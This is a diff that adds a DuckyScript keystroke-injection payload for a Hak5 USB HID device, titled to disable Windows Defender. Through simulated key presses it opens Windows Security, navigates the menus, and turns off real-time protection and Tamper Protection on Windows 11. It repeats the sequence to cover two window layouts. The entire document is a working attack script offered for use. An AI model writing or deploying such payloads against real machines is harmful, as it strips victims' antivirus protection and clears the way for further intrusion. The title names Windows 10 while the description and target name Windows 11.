@@ -1,0 +1,126 @@
+REM Title:         Disable_Windows10_Defender
+REM Description    Disable Windows Defender and Tamper protection on Windows 11
+REM Author:        Shermanator21
+REM Props:         Hak5 Team
+REM Version:       1.0
+REM Target:        Windows 11
+REM Attackmodes:   HID
+DELAY 1000
+
+REM Round 1: Default Windowed Spacing (Because spacing of window can vary, it adds a variable that will affect the navigation)
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 500
+STRING windows security
+DELAY 500
+ENTER
+DELAY 500
+REM Navigate to Manage Settings then turn off Realtime Protection
+ENTER
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFT
+ENTER
+REM Navigate to  turn off Tamper Protection
+DELAY 500
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 500
+SPACE
+DELAY 500
+ALT F4
+REM Tamper and Real Time now disabled
+
+DELAY 1000
+
+REM Round 2: Full Windowed Spacing
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 500
+STRING windows security
+DELAY 500
+ENTER
+DELAY 500
+REM Navigate to Manage Settings then turn off Realtime Protection
+ENTER
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFT
+ENTER
+REM Navigate to  turn off Tamper Protection
+DELAY 500
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+SPACE
+DELAY 500
+ALT F4
+REM Tamper and Real Time now disabled
